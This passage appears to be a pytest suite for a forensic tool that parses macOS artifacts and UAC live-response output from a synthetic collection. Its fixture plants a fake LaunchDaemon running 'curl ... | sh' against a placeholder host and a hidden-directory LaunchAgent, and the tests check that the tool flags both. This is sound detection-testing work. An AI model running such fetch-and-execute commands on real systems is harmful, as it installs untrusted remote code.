"""macOS artifacts and UAC live-response output, end to end on a synthetic UAC collection.

Every value here is made up: host names, users, URLs and bundle ids are placeholders.
"""
from __future__ import annotations

import plistlib
import sqlite3
from datetime import datetime, timezone
from pathlib import Path

import pytest

from app.ingest.detector import classify_artifact
from app.ingest.host_user_extraction import extract_host_user_documents
from app.ingest.macos.dispatch import parse_macos_artifact_file, parse_uac_artifact_file
from app.ingest.macos.helpers import list_macos_artifacts, looks_like_macos_artifact
from app.ingest.normalizer import normalize_file
from app.ingest.uac.collection import detect_uac_collection, uac_collection_for
from app.ingest.uac.live_response import looks_like_uac_output, split_address

COCOA = datetime(2001, 1, 1, tzinfo=timezone.utc)


def _cocoa(moment: datetime) -> float:
    return (moment - COCOA).total_seconds()


def _write(path: Path, content: str | bytes) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(content, bytes):
        path.write_bytes(content)
    else:
        path.write_text(content, encoding="utf-8")
    return path


def _plist(path: Path, value: object, fmt=plistlib.FMT_BINARY) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(plistlib.dumps(value, fmt=fmt))
    return path


UAC_LOG = """2026-01-10 09:00:00 +0100 INF Unix-like Artifacts Collector 3.4.0
2026-01-10 09:00:00 +0100 INF UAC directory: /Volumes/usb/uac-3.4.0
2026-01-10 09:00:00 +0100 INF Command line: ./uac -p full /Volumes/usb/out
2026-01-10 09:00:00 +0100 INF Operating system: macos
2026-01-10 09:00:00 +0100 INF System architecture: arm64
2026-01-10 09:00:00 +0100 INF Hostname: test-mac.local
2026-01-10 09:00:00 +0100 INF Time zone: Europe/Madrid
2026-01-10 09:00:01 +0100 INF Artifacts collection started
"""


@pytest.fixture()
def uac_root(tmp_path: Path) -> Path:
    root = tmp_path / "collection"
    _write(root / "uac.log", UAC_LOG)
    fs = root / "[root]"
    _plist(fs / "Library/LaunchDaemons/com.example.updater.plist", {
        "Label": "com.example.updater",
        "ProgramArguments": ["/bin/bash", "-c", "curl -s https://updates.example.invalid/x | sh"],
        "RunAtLoad": True,
        "KeepAlive": True,
    })
    _plist(fs / "Users/alice/Library/LaunchAgents/com.example.helper.plist", {
        "Label": "com.example.helper",
        "Program": "/private/tmp/.hidden/helper",
        "StartInterval": 600,
    }, fmt=plistlib.FMT_XML)
    _plist(fs / "System/Library/LaunchDaemons/com.apple.sealed.plist", {"Label": "com.apple.sealed", "Program": "/usr/libexec/sealed"})
    _plist(fs / "System/Library/CoreServices/SystemVersion.plist", {"ProductName": "macOS", "ProductVersion": "15.1", "ProductUserVisibleVersion": "15.1", "ProductBuildVersion": "24B83"})
    policy = plistlib.dumps({"creationTime": 1_700_000_000.0, "passwordLastSetTime": 1_700_100_000.0, "failedLoginCount": 2, "failedLoginTimestamp": 1_700_200_000.0})
    _plist(fs / "private/var/db/dslocal/nodes/Default/users/alice.plist", {
        "name": ["alice"], "uid": ["501"], "gid": ["20"], "home": ["/Users/alice"], "shell": ["/bin/zsh"],
        "realname": ["Alice Example"], "generateduid": ["00000000-0000-0000-0000-000000000501"],
        "accountPolicyData": [policy], "ShadowHashData": [b"never-read"],
    })
    _plist(fs / "private/var/db/dslocal/nodes/Default/users/_svc.plist", {
        "name": ["_svc"], "uid": ["250"], "gid": ["250"], "home": ["/var/empty"], "shell": ["/usr/bin/false"],
        "accountPolicyData": [plistlib.dumps({"creationTime": 1_600_000_000.0})],
    })
    _plist(fs / "private/var/db/dslocal/nodes/Default/groups/admin.plist", {"name": ["admin"], "gid": ["80"], "users": ["root", "alice"]})

    quarantine = fs / "Users/alice/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2"
    quarantine.parent.mkdir(parents=True, exist_ok=True)
    with sqlite3.connect(quarantine) as connection:
        connection.execute(
            "CREATE TABLE LSQuarantineEvent (LSQuarantineEventIdentifier TEXT PRIMARY KEY NOT NULL, LSQuarantineTimeStamp REAL, "
            "LSQuarantineAgentBundleIdentifier TEXT, LSQuarantineAgentName TEXT, LSQuarantineDataURLString TEXT, LSQuarantineSenderName TEXT, "
            "LSQuarantineSenderAddress TEXT, LSQuarantineTypeNumber INTEGER, LSQuarantineOriginTitle TEXT, LSQuarantineOriginURLString TEXT, LSQuarantineOriginAlias BLOB)"
        )
        connection.execute(
            "INSERT INTO LSQuarantineEvent VALUES (?,?,?,?,?,?,?,?,?,?,?)",
            ("Q1", _cocoa(datetime(2026, 1, 5, 12, 0, tzinfo=timezone.utc)), "com.example.browser", "ExampleBrowser",
             "https://downloads.example.invalid/tool.dmg", None, None, 0, None, "https://www.example.invalid/page", None),
        )

    knowledge = fs / "Users/alice/Library/Application Support/Knowledge/knowledgeC.db"
    knowledge.parent.mkdir(parents=True, exist_ok=True)
    with sqlite3.connect(knowledge) as connection:
        connection.execute("CREATE TABLE ZOBJECT (Z_PK INTEGER PRIMARY KEY, ZSTREAMNAME VARCHAR, ZSTARTDATE TIMESTAMP, ZENDDATE TIMESTAMP, ZVALUESTRING VARCHAR, ZVALUEINTEGER INTEGER, ZSECONDSFROMGMT INTEGER, ZSTRUCTUREDMETADATA INTEGER, ZSOURCE INTEGER)")
        connection.execute("CREATE TABLE ZSTRUCTUREDMETADATA (Z_PK INTEGER PRIMARY KEY, Z_DKDIGITALHEALTHMETADATAKEY__WEBPAGEURL VARCHAR, Z_DKDIGITALHEALTHMETADATAKEY__WEBDOMAIN VARCHAR, Z_DKBLUETOOTHMETADATAKEY__NAME VARCHAR, Z_DKBLUETOOTHMETADATAKEY__ADDRESS VARCHAR)")
        connection.execute("CREATE TABLE ZSOURCE (Z_PK INTEGER PRIMARY KEY, ZBUNDLEID VARCHAR)")
        start = _cocoa(datetime(2026, 1, 6, 8, 0, tzinfo=timezone.utc))
        connection.execute("INSERT INTO ZSTRUCTUREDMETADATA VALUES (1, 'https://docs.example.invalid/a', 'docs.example.invalid', NULL, NULL)")
        connection.execute("INSERT INTO ZSTRUCTUREDMETADATA VALUES (2, NULL, NULL, 'Example Headset', '00:11:22:33:44:55')")
        connection.executemany("INSERT INTO ZOBJECT VALUES (?,?,?,?,?,?,?,?,?)", [
            (1, "/app/usage", start, start + 90, "com.example.editor", None, 3600, None, None),
            (2, "/app/webUsage", start + 100, start + 160, "com.example.browser", None, 3600, 1, None),
            (3, "/bluetooth/isConnected", start + 200, start + 400, None, 1, 3600, 2, None),
            (4, "/display/isBacklit", start + 500, start + 600, None, 1, 3600, None, None),
            (5, "/some/undocumented/stream", start, start, "x", None, 0, None, None),
        ])

    tcc = fs / "Library/Application Support/com.apple.TCC/TCC.db"
    tcc.parent.mkdir(parents=True, exist_ok=True)
    with sqlite3.connect(tcc) as connection:
        connection.execute("CREATE TABLE access (service TEXT NOT NULL, client TEXT NOT NULL, client_type INTEGER NOT NULL, auth_value INTEGER NOT NULL, auth_reason INTEGER NOT NULL, indirect_object_identifier TEXT, last_modified INTEGER)")
        connection.executemany("INSERT INTO access VALUES (?,?,?,?,?,?,?)", [
            ("kTCCServiceSystemPolicyAllFiles", "com.example.backup", 0, 2, 2, "UNUSED", 1_767_000_000),
            ("kTCCServiceCamera", "com.example.chat", 0, 0, 2, "UNUSED", 1_767_000_100),
        ])

    _write(fs / "private/var/log/install.log", (
        "2026-01-04 10:00:00+01 test-mac installd[100]: PackageKit: ----- Begin install -----\n"
        "2026-01-04 10:00:05+01 test-mac installd[100]: Installed \"Example Tool\" (2.1)\n"
        "  continuation of the previous line\n"
        "2026-01-04 10:00:06+01 test-mac installd[100]: PackageKit: Writing receipt for com.example.tool to /\n"
    ))
    _write(fs / "private/var/log/wifi.log", "Sat Jan  3 22:15:01.250 [airport] joined network\n")
    _write(fs / "Users/alice/.zsh_history", ": 1767225600:0;ls -la\n: 1767225660:0;sudo whoami\n")
    _write(fs / "private/etc/sudoers", "root ALL = (ALL) ALL\n%admin ALL = (ALL) ALL\n")
    # Decoys: files the full profile also copies, which are not macOS artifacts.
    _write(fs / "Users/alice/Desktop/case/setupapi.dev.log", ">>>  [Device Install (Hardware initiated) - USB\\VID_0000]\n")
    _write(fs / "Users/alice/Documents/report.csv", "EventID,Message\n4624,logon\n")
    _write(fs / "opt/homebrew/var/log/nginx/error.log", "2026/01/01 00:00:00 [error] 1#1: example\n")

    lr = root / "live_response"
    _write(lr / "process/ps_-eo_user_pid_ppid_pcpu_pmem_tty_stat_lstart_args.txt", (
        "USER               PID  PPID  %CPU %MEM TTY      STAT STARTED                      ARGS\n"
        "root                 1     0   0.4  0.1 ??       Ss   Sat Jan 10 08:00:00 2026     /sbin/launchd\n"
        "alice              640     1   1.0  0.5 ??       S    Sat Jan 10 08:30:15 2026     /Applications/Example.app/Contents/MacOS/Example --flag value\n"
    ))
    _write(lr / "process/strings/sbin_launchd.txt.gz", b"\x1f\x8b")
    _write(lr / "network/netstat_-anp_tcp.txt", (
        "Active Internet connections (including servers)\n"
        "Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)\n"
        "tcp4       0      0  10.0.0.5.51298         203.0.113.7.443        ESTABLISHED\n"
        "tcp6       0      0  *.22                   *.*                    LISTEN\n"
    ))
    _write(lr / "network/lsof_-nPli.txt", (
        "COMMAND     PID     USER   FD   TYPE             DEVICE SIZE/OFF   NODE NAME\n"
        "Example     640      501   21u  IPv4 0x0000000000000001      0t0    TCP 10.0.0.5:51298->203.0.113.7:443 (ESTABLISHED)\n"
        "launchd       1        0   30u  IPv4 0x0000000000000002      0t0    UDP *:138\n"
    ))
    _write(lr / "system/launchctl_list.txt", "PID\tStatus\tLabel\n640\t0\tcom.example.helper\n-\t78\tcom.example.updater\n")
    _write(lr / "system/last.txt", (
        "alice     ttys001                         Sat Jan 10 08:55   still logged in\n"
        "alice     ttys000  198.51.100.4           Wed Dec 31 23:10 - 23:40  (00:30)\n"
        "reboot    ~                               Wed Dec 31 22:00\n"
        "\nwtmp begins Wed Dec 31 22:00\n"
    ))
    _write(lr / "system/sw_vers.txt", "ProductName:\t\tmacOS\nProductVersion:\t\t15.1\nBuildVersion:\t\t24B83\n")
    _write(lr / "system/uname_-a.txt", "Darwin test-mac.local 24.1.0 Darwin Kernel Version 24.1.0: root:xnu~1/RELEASE_ARM64 arm64\n")
    _write(lr / "packages/softwareupdate_--history_--all.txt", (
        "Display Name                                       Version    Date\n"
        "------------                                       -------    ----\n"
        "macOS Example Update                         15.1       01/02/2026, 07:30:00\n"
    ))
    _write(lr / "packages/brew_list_--formula.txt", "jq\nwget\n")
    _write(lr / "system/df.txt", "Filesystem 512-blocks Used\n")
    _write(root / "bodyfile/bodyfile.txt", "0|/|2|drwxr-xr-x|0|0|736|1|1|1|1\n")
    return root


def _rows(root: Path, relative: str, parser: str | None = None) -> list[dict]:
    path = root / relative
    if parser is None:
        return parse_uac_artifact_file(path, artifact_type=None, source_path=relative)
    return parse_macos_artifact_file(path, parser=parser, artifact_type=None, source_path=relative)


def test_uac_log_header_is_read_without_the_command_line(uac_root: Path) -> None:
    collection = detect_uac_collection(uac_root.parent)
    assert collection is not None
    facts = collection.as_metadata()
    assert facts == {
        "version": "3.4.0", "operating_system": "macos", "architecture": "arm64", "hostname": "test-mac.local",
        "timezone": "Europe/Madrid", "profile": "full", "started_at": "2026-01-10T09:00:00+01:00",
    }
    assert "/Volumes/usb" not in str(facts)
    assert uac_collection_for(uac_root / "live_response/system/last.txt").operating_system == "macos"


def test_uac_log_with_unknown_os_does_not_decide_the_platform(tmp_path: Path) -> None:
    root = tmp_path / "c"
    _write(root / "uac.log", UAC_LOG.replace("Operating system: macos", "Operating system: plan9"))
    (root / "live_response").mkdir()
    assert detect_uac_collection(tmp_path).operating_system is None


def test_macos_collection_reads_only_the_artifact_list(uac_root: Path) -> None:
    artifacts, stats = list_macos_artifacts(uac_root)
    by_path = {item["source_path"]: item for item in artifacts}
    parsers = {path: item["parser"] for path, item in by_path.items()}
    assert parsers["[root]/Library/LaunchDaemons/com.example.updater.plist"] == "macos_launchd_raw"
    assert parsers["[root]/Users/alice/Library/LaunchAgents/com.example.helper.plist"] == "macos_launchd_raw"
    assert parsers["[root]/private/var/db/dslocal/nodes/Default/users/alice.plist"] == "macos_accounts_raw"
    assert parsers["[root]/Users/alice/.zsh_history"] == "linux_shell_raw"
    assert parsers["[root]/private/etc/sudoers"] == "linux_sudoers_raw"
    assert parsers["live_response/process/ps_-eo_user_pid_ppid_pcpu_pmem_tty_stat_lstart_args.txt"] == "uac_live_response_raw"
    assert parsers["uac.log"] == "uac_live_response_raw"
    # The sealed system volume, other tools' files and UAC outputs that are not parsed stay out.
    for absent in (
        "[root]/System/Library/LaunchDaemons/com.apple.sealed.plist",
        "[root]/Users/alice/Desktop/case/setupapi.dev.log",
        "[root]/Users/alice/Documents/report.csv",
        "[root]/opt/homebrew/var/log/nginx/error.log",
        "live_response/system/df.txt",
        "bodyfile/bodyfile.txt",
    ):
        assert absent not in by_path
    assert not any("process/strings" in path for path in by_path)
    assert all(item["os_type"] == "macos" for item in artifacts)
    assert stats["files_not_parsed"] == stats["files_seen"] - stats["artifacts_listed"] > 0


def test_launchd_jobs_and_their_review_leads(uac_root: Path) -> None:
    daemon = _rows(uac_root, "[root]/Library/LaunchDaemons/com.example.updater.plist", "macos_launchd_raw")[0]
    assert daemon["artifact_type"] == "launch_daemon"
    assert daemon["persistence_scope"] == "system"
    assert daemon["command_line"].startswith("/bin/bash -c curl")
    assert daemon["triggers"] == ["at load", "kept alive"]
    assert daemon["suspicious_indicators"] == ["inline_interpreter_code"]
    agent = _rows(uac_root, "[root]/Users/alice/Library/LaunchAgents/com.example.helper.plist", "macos_launchd_raw")[0]
    assert agent["username"] == "alice"
    assert agent["triggers"] == ["every 600s"]
    assert set(agent["suspicious_indicators"]) == {"program_in_temporary_or_shared_location", "program_in_hidden_directory"}
    assert agent["timestamp_status"] == "file_mtime"


def test_unreadable_launchd_plist_is_reported_not_dropped(uac_root: Path) -> None:
    broken = _write(uac_root / "[root]/Library/LaunchAgents/broken.plist", "not a plist")
    row = parse_macos_artifact_file(broken, parser="macos_launchd_raw", artifact_type=None, source_path="[root]/Library/LaunchAgents/broken.plist")[0]
    assert row["parse_status"] == "invalid"
    assert row["event_action"] == "launchd_plist_unreadable"


def test_quarantine_knowledgec_and_tcc(uac_root: Path) -> None:
    quarantine = _rows(uac_root, "[root]/Users/alice/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2", "macos_quarantine_raw")
    assert quarantine[0]["timestamp"] == "2026-01-05T12:00:00+00:00"
    assert quarantine[0]["data_url"] == "https://downloads.example.invalid/tool.dmg"
    assert quarantine[0]["username"] == "alice"
    assert quarantine[0]["quarantine_type"] == "web download"

    knowledge = _rows(uac_root, "[root]/Users/alice/Library/Application Support/Knowledge/knowledgeC.db", "macos_knowledgec_raw")
    kinds = {row["artifact_type"]: row for row in knowledge}
    assert set(kinds) == {"app_usage", "web_usage", "bluetooth_connection", "display_backlight"}
    assert kinds["app_usage"]["bundle_id"] == "com.example.editor"
    assert kinds["app_usage"]["duration_seconds"] == 90
    assert kinds["web_usage"]["url"] == "https://docs.example.invalid/a"
    assert kinds["bluetooth_connection"]["bluetooth_name"] == "Example Headset"
    assert kinds["display_backlight"]["message"] == "Display turned on"

    tcc = {row["tcc_client"]: row for row in _rows(uac_root, "[root]/Library/Application Support/com.apple.TCC/TCC.db", "macos_tcc_raw")}
    assert tcc["com.example.backup"]["tcc_service_label"] == "Full Disk Access"
    assert tcc["com.example.backup"]["tcc_decision"] == "allowed"
    assert tcc["com.example.backup"]["sensitive_permission"] is True
    assert tcc["com.example.chat"]["tcc_decision"] == "denied"
    assert tcc["com.example.chat"]["sensitive_permission"] is False
    assert tcc["com.example.backup"]["tcc_scope"] == "system"


def test_dslocal_accounts_without_password_hashes(uac_root: Path) -> None:
    rows = _rows(uac_root, "[root]/private/var/db/dslocal/nodes/Default/users/alice.plist", "macos_accounts_raw")
    account = rows[0]
    assert account["username"] == "alice"
    assert account["uid"] == "501"
    assert account["system_account"] is False
    assert account["failed_login_count"] == 2
    assert account["timestamp"] is None
    assert [row["event_action"] for row in rows[1:]] == ["account_created", "password_changed", "login_failed"]
    assert "never-read" not in str(rows)
    service = _rows(uac_root, "[root]/private/var/db/dslocal/nodes/Default/users/_svc.plist", "macos_accounts_raw")
    assert service[0]["system_account"] is True
    group = parse_macos_artifact_file(
        uac_root / "[root]/private/var/db/dslocal/nodes/Default/groups/admin.plist",
        parser="macos_accounts_raw", artifact_type="local_group",
        source_path="[root]/private/var/db/dslocal/nodes/Default/groups/admin.plist",
    )[0]
    assert group["members"] == ["root", "alice"]


def test_install_and_wifi_logs(uac_root: Path) -> None:
    install = _rows(uac_root, "[root]/private/var/log/install.log", "macos_logs_raw")
    assert install[0]["timestamp"] == "2026-01-04T09:00:00+00:00"
    assert install[1]["event_action"] == "package_installed"
    assert install[1]["package"] == "Example Tool"
    assert install[1]["package_version"] == "2.1"
    assert "continuation" in install[1]["message"]
    assert install[2]["event_action"] == "package_receipt_written"
    wifi = _rows(uac_root, "[root]/private/var/log/wifi.log", "macos_logs_raw")
    assert wifi[0]["timestamp"].endswith("+00:00")
    assert wifi[0]["timestamp_status"].startswith("inferred_year")


def test_process_list_times_use_the_collection_time_zone(uac_root: Path) -> None:
    rows = _rows(uac_root, "live_response/process/ps_-eo_user_pid_ppid_pcpu_pmem_tty_stat_lstart_args.txt")
    example = next(row for row in rows if row["pid"] == 640)
    assert example["ppid"] == 1
    assert example["username"] == "alice"
    assert example["command_line"] == "/Applications/Example.app/Contents/MacOS/Example --flag value"
    assert example["process_name"] == "Example"
    # 08:30:15 in Madrid (UTC+1 in January).
    assert example["timestamp"] == "2026-01-10T07:30:15+00:00"
    assert example["timestamp_status"] == "host_timezone"


def test_network_outputs(uac_root: Path) -> None:
    netstat = _rows(uac_root, "live_response/network/netstat_-anp_tcp.txt")
    assert netstat[0]["local_ip"] == "10.0.0.5" and netstat[0]["local_port"] == 51298
    assert netstat[0]["remote_ip"] == "203.0.113.7" and netstat[0]["remote_port"] == 443
    assert netstat[0]["connection_state"] == "ESTABLISHED"
    assert netstat[0]["timestamp_status"] == "collection_time"
    assert netstat[1]["connection_state"] == "LISTEN" and netstat[1]["local_port"] == 22
    lsof = _rows(uac_root, "live_response/network/lsof_-nPli.txt")
    assert lsof[0]["process_name"] == "Example" and lsof[0]["pid"] == 640 and lsof[0]["uid"] == "501"
    assert lsof[0]["remote_ip"] == "203.0.113.7"
    assert lsof[1]["network_protocol"] == "udp" and lsof[1]["local_port"] == 138


def test_linux_netstat_format(tmp_path: Path) -> None:
    path = _write(tmp_path / "live_response/network/netstat_-anp.txt", (
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n"
        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      812/sshd\n"
        "tcp        0     36 192.0.2.10:22           198.51.100.9:50412      ESTABLISHED 1201/sshd: bob\n"
        "udp        0      0 0.0.0.0:68              0.0.0.0:*                           640/dhclient\n"
        "Active UNIX domain sockets (servers and established)\n"
        "unix  2      [ ACC ]     STREAM     LISTENING     1234     1/init  /run/systemd/private\n"
    ))
    rows = parse_uac_artifact_file(path, artifact_type=None, source_path="live_response/network/netstat_-anp.txt")
    assert [(row["local_port"], row["pid"], row["process_name"]) for row in rows] == [(22, 812, "sshd"), (22, 1201, "sshd:"), (68, 640, "dhclient")]
    assert rows[1]["remote_ip"] == "198.51.100.9"


@pytest.mark.parametrize(("value", "expected"), [
    ("0.0.0.0:22", ("0.0.0.0", 22)),
    (":::22", ("::", 22)),
    ("[::1]:631", ("::1", 631)),
    ("192.0.2.5.443", ("192.0.2.5", 443)),
    ("fe80::1%lo0.49152", ("fe80::1%lo0", 49152)),
    ("*.137", ("*", 137)),
    ("*.*", ("*", None)),
    ("0.0.0.0:*", ("0.0.0.0", None)),
])
def test_split_address(value: str, expected: tuple) -> None:
    assert split_address(value) == expected


def test_last_infers_years_backwards_from_the_collection(uac_root: Path) -> None:
    rows = _rows(uac_root, "live_response/system/last.txt")
    assert [row["event_action"] for row in rows] == ["login_session", "login_session", "system_boot"]
    assert rows[0]["session_state"] == "still_logged_in"
    # Dec 31 is before the Jan 10 collection: it belongs to the previous year.
    assert rows[1]["timestamp"] == "2025-12-31T22:10:00+00:00"
    assert rows[1]["session_end"] == "2025-12-31T22:40:00+00:00"
    assert rows[1]["remote_host"] == "198.51.100.4"
    assert rows[2]["username"] == ""


def test_launchctl_packages_and_host_identity(uac_root: Path) -> None:
    jobs = {row["launchd_label"]: row for row in _rows(uac_root, "live_response/system/launchctl_list.txt")}
    assert jobs["com.example.helper"]["running"] is True
    assert jobs["com.example.updater"]["exit_status"] == 78
    updates = _rows(uac_root, "live_response/packages/softwareupdate_--history_--all.txt")
    assert updates[0]["package"] == "macOS Example Update"
    assert updates[0]["timestamp"] == "2026-01-02T06:30:00+00:00"
    brew = _rows(uac_root, "live_response/packages/brew_list_--formula.txt")
    assert [row["package"] for row in brew] == ["jq", "wget"]
    facts = {row["fact_type"]: row["normalized_value"] for row in _rows(uac_root, "live_response/system/sw_vers.txt") + _rows(uac_root, "live_response/system/uname_-a.txt")}
    assert facts == {"host.distribution": "macOS", "host.distribution_version": "15.1 (24B83)", "host.kernel": "Darwin 24.1.0", "host.architecture": "arm64"}


def test_normalized_documents_are_macos(uac_root: Path) -> None:
    artifacts, _ = list_macos_artifacts(uac_root)
    by_path = {item["source_path"]: item for item in artifacts}

    launchd = by_path["[root]/Library/LaunchDaemons/com.example.updater.plist"]
    document = normalize_file("case", "evidence", "artifact", launchd["path"], dict(launchd))[0]
    assert document["os"]["type"] == "macos"
    assert document["host"]["os"] == "macOS"
    assert document["persistence"]["name"] == "com.example.updater"
    assert document["persistence"]["mechanism"] == "launch_daemon"
    # A lead from the launchd flags, raised further by the shared suspicious-command heuristics (curl | sh).
    assert document["event"]["severity"] in {"medium", "high"}
    assert document["macos"]["suspicious_indicators"] == ["inline_interpreter_code"]

    shell = by_path["[root]/Users/alice/.zsh_history"]
    commands = normalize_file("case", "evidence", "artifact", shell["path"], dict(shell))
    assert [doc["linux"]["command"] for doc in commands] == ["ls -la", "sudo whoami"]
    assert {doc["os"]["type"] for doc in commands} == {"macos"}
    assert {doc["user"]["name"] for doc in commands} == {"alice"}

    netstat = by_path["live_response/network/netstat_-anp_tcp.txt"]
    connections = normalize_file("case", "evidence", "artifact", netstat["path"], dict(netstat))
    assert connections[0]["network"]["destination_ip"] == "203.0.113.7"
    assert connections[0]["uac"]["uac_command"] == "netstat_-anp_tcp"
    # Observed at acquisition: searchable, not a timeline event.
    assert connections[0]["event"]["timeline_include"] is False

    processes = by_path["live_response/process/ps_-eo_user_pid_ppid_pcpu_pmem_tty_stat_lstart_args.txt"]
    process = normalize_file("case", "evidence", "artifact", processes["path"], dict(processes))[1]
    assert process["process"]["pid"] == 640
    assert process["process"]["parent_pid"] == 1
    assert process["os"]["type"] == "macos"


def test_host_users_from_dslocal(uac_root: Path) -> None:
    artifacts, _ = list_macos_artifacts(uac_root)
    documents = []
    for item in artifacts:
        if item["parser"] == "macos_accounts_raw":
            documents.extend(normalize_file("case", "evidence", "artifact", item["path"], dict(item)))
    facts = [doc["host_user_fact"] for doc in extract_host_user_documents(documents)]
    alice = next(fact for fact in facts if fact["source_kind"] == "dslocal_account" and fact["username"] == "alice")
    assert alice["uid"] == "501" and alice["home"] == "/Users/alice" and alice["gecos"] == "Alice Example"
    assert alice["attributes"]["failed_login_count"] == 2
    assert {"source_kind": "group_membership", "username": "alice", "group_name": "admin", "group_gid": "80"}.items() <= next(
        fact for fact in facts if fact["source_kind"] == "group_membership" and fact["username"] == "alice"
    ).items()


def test_linux_uac_outputs_route_through_the_general_classifier(tmp_path: Path) -> None:
    ps = _write(tmp_path / "live_response/process/ps_-eo_pid_ppid_user_lstart_args.txt", "PID PPID USER STARTED ARGS\n")
    assert classify_artifact(ps)["parser"] == "uac_live_response_raw"
    bodyfile = _write(tmp_path / "bodyfile/bodyfile.txt", "0|/|2|d|0|0|0|0|0|0|0\n")
    assert classify_artifact(bodyfile)["parser"] == "not_implemented"
    other = _write(tmp_path / "live_response/system/df.txt", "Filesystem\n")
    assert classify_artifact(other)["parser"] == "not_implemented"
    assert looks_like_uac_output("live_response/process/strings/bin_ls.txt") is None


def test_path_routing_ignores_lookalikes() -> None:
    assert looks_like_macos_artifact("[root]/Library/LaunchAgents/x.plist")[0] == "macos_launchd"
    assert looks_like_macos_artifact("[root]/System/Library/LaunchAgents/x.plist") is None
    assert looks_like_macos_artifact("[root]/Users/alice/Desktop/LaunchAgents/x.plist") is None
    assert looks_like_macos_artifact("[root]/private/var/log/install.log.0.gz")[1] == "install_log"
    assert looks_like_macos_artifact("[root]/Users/alice/notes/install.log") is None


def test_safari_history(tmp_path: Path) -> None:
    from app.ingest.browser.sqlite_safari import parse_safari_history_sqlite

    database = tmp_path / "Users/alice/Library/Safari/History.db"
    database.parent.mkdir(parents=True)
    with sqlite3.connect(database) as connection:
        connection.execute("CREATE TABLE history_items (id INTEGER PRIMARY KEY, url TEXT NOT NULL, visit_count INTEGER)")
        connection.execute("CREATE TABLE history_visits (id INTEGER PRIMARY KEY, history_item INTEGER, visit_time REAL, title TEXT, load_successful BOOLEAN, redirect_source INTEGER)")
        connection.execute("INSERT INTO history_items VALUES (1, 'https://www.google.com/search?q=example+query', 1)")
        connection.execute("INSERT INTO history_visits VALUES (1, 1, ?, 'example query', 1, NULL)", (_cocoa(datetime(2026, 1, 7, 10, 0, tzinfo=timezone.utc)),))
    rows, _ = parse_safari_history_sqlite(database, source_path="[root]/Users/alice/Library/Safari/History.db")
    assert rows[0]["Browser"] == "Safari"
    assert rows[0]["User"] == "alice"
    assert rows[0]["Visit Time"] == "2026-01-07T10:00:00+00:00"
    assert rows[1]["Search Term"] == "example query"


def test_preflight_reads_the_uac_header(uac_root: Path, tmp_path: Path) -> None:
    import tarfile

    from app.services.evidence_preflight import _inspect_archive_or_folder

    archive = tmp_path / "uac-collection.tar"
    with tarfile.open(archive, "w") as handle:
        for item in sorted(uac_root.rglob("*")):
            handle.add(item, arcname=str(item.relative_to(uac_root)), recursive=False)
    work = tmp_path / "preflight"
    work.mkdir()
    result = _inspect_archive_or_folder(archive, declared_platform="auto", tmp_dir=work)
    assert result["platform"] == "macos"
    assert result["hostname"] == "test-mac.local"
    assert "LaunchAgents & LaunchDaemons" in result["expected_parsers"]
    assert "UAC live response" in result["expected_parsers"]


def test_macos_workbench_is_registered() -> None:
    from app.services.case_capabilities import CAPABILITY_REGISTRY, surface_route_prefix

    assert surface_route_prefix("macos") == "mac"
    routes = {item["id"]: item["route"] for item in CAPABILITY_REGISTRY if item["platform"] == "macos"}
    assert routes["macos.execution.command_history"] == "/cases/:caseId/mac/execution/command-history"
    assert routes["macos.persistence.launchd"] == "/cases/:caseId/artifacts?artifact_type=macos_launchd"


def test_uac_log_gives_time_zone_and_host_name_facts(uac_root: Path) -> None:
    facts = {row["fact_type"]: row["normalized_value"] for row in _rows(uac_root, "uac.log")}
    assert facts == {"host.timezone": "Europe/Madrid", "host.hostname": "test-mac", "host.fqdn": "test-mac.local"}
    stray = _write(uac_root.parent / "notes/uac.log", "not written by UAC\n")
    assert parse_uac_artifact_file(stray, artifact_type=None, source_path="notes/uac.log") == []


def test_archives_collected_by_uac_are_not_unpacked(uac_root: Path) -> None:
    import gzip
    import zipfile

    from app.ingest.uac.collection import collected_by_uac
    from app.workers.tasks import _classify_and_dispatch_extracted

    user_zip = uac_root / "[root]/Users/alice/Desktop/photos.zip"
    with zipfile.ZipFile(user_zip, "w") as handle:
        handle.writestr("a.txt", "x")
    strings = uac_root / "live_response/process/strings/bin_ls.txt.gz"
    strings.write_bytes(gzip.compress(b"strings"))
    wtmp = uac_root / "[root]/var/log/wtmp.1.gz"
    wtmp.parent.mkdir(parents=True, exist_ok=True)
    wtmp.write_bytes(gzip.compress(b"\0" * 384))
    assert collected_by_uac(user_zip) and collected_by_uac(strings)
    assert not collected_by_uac(uac_root / "uac.log")

    entries = [
        {"path": str(path.relative_to(uac_root)), "status": "extracted", "ignored": False, "size": path.stat().st_size}
        for path in (user_zip, strings, wtmp)
    ]
    _files, result, _ = _classify_and_dispatch_extracted(db=None, evidence=None, extract_dir=uac_root, extracted_files=[e["path"] for e in entries], archive_entries=entries)
    nested = sorted(path.name for path in uac_root.iterdir() if path.name.startswith("_nested_"))
    assert nested == ["_nested_0_wtmp.1"]
    assert {entry["path"] for entry in result} >= {e["path"] for e in entries[:2]}


def test_empty_blocks_are_not_indexed() -> None:
    from app.core.opensearch import sanitize_document_for_index

    document = {
        "event_id": "e1", "search_text": "x", "tags": [], "data_quality": [],
        "event": {"category": None}, "host": {"name": None}, "user": {"name": None}, "artifact": {"type": "t"},
        "usb": {"vendor": None, "serials": []}, "lnk": {"target": {"path": None}},
        "linux": {"command": "ls", "pid": None},
    }
    indexed = sanitize_document_for_index(document)
    assert "usb" not in indexed and "lnk" not in indexed
    # Present blocks stay whole (nulls included); required blocks and lists stay even when empty.
    assert indexed["linux"] == {"command": "ls", "pid": None}
    assert {"event", "host", "user", "artifact", "tags", "data_quality"} <= set(indexed)
    assert "usb" in document  # the caller's document is untouched


def test_repeated_log_lines_fold_within_the_hour(tmp_path: Path) -> None:
    from app.ingest.macos.logs import collapse_repeats

    rows = [
        {"timestamp": "2026-01-01T10:00:01+00:00", "message": "denied lookup: requestor = app[100]"},
        {"timestamp": "2026-01-01T10:20:00+00:00", "message": "denied lookup: requestor = app[205]"},
        {"timestamp": "2026-01-01T10:59:00+00:00", "message": "denied lookup: requestor = other[7]"},
        {"timestamp": "2026-01-01T11:00:00+00:00", "message": "denied lookup: requestor = app[300]"},
        {"timestamp": None, "message": "no time"},
